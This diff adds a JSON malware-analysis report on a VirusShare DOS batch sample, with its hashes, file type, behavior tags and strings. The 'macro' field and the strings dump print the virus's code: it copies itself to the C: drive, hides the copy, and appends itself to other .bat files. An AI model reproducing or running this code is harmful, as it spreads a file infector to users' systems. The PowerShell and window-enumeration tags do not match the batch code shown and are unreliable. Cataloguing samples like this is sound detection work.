@@ -1,0 +1,43 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "command": "May run PowerShell commands",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "@echo off\nif not exist c:\\123584.bat copy 123584.bat c:\\ >nul\nif not exist c:\\123584.bat copy %0.bat c:\\123584.bat >nul\nattrib 123584.bat +h\nfor %%x in (..\\*.bat *.bat c:\\*.bat c:\\windows\\*.bat c:\\windows\\command\\*.bat e:\\*.bat) do set 123584_v=%%x\nfind /i \"123584\"<%123584_v%>nul\nif errorlevel 1 find \"123584\"<%0.bat>>%123584_v%\necho.|date|find \"56\">nul\nif errorlevel 1 goto nada"
+    },
+    "filename": "VirusShare_4b3c1b1f4fc0ff4c0a8f0f0c53d94df0",
+    "filesize": 390,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "4b3c1b1f4fc0ff4c0a8f0f0c53d94df0",
+        "sha1": "c49f36f233ff25a641c3f1f630d4c7916cf9e7a9",
+        "sha256": "e31285d676d378289810c816accc544ff09acb22f1772384b467868edeabbc56"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "if not exist c:\\123584.bat copy 123584.bat c:\\ >nul",
+            "if not exist c:\\123584.bat copy %0.bat c:\\123584.bat >nul",
+            "attrib 123584.bat +h",
+            "for %%x in (..\\*.bat *.bat c:\\*.bat c:\\windows\\*.bat c:\\windows\\command\\*.bat e:\\*.bat) do set 123584_v=%%x",
+            "find /i \"123584\"<%123584_v%>nul",
+            "if errorlevel 1 find \"123584\"<%0.bat>>%123584_v%",
+            "echo.|date|find \"56\">nul",
+            "if errorlevel 1 goto nada"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.269349",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
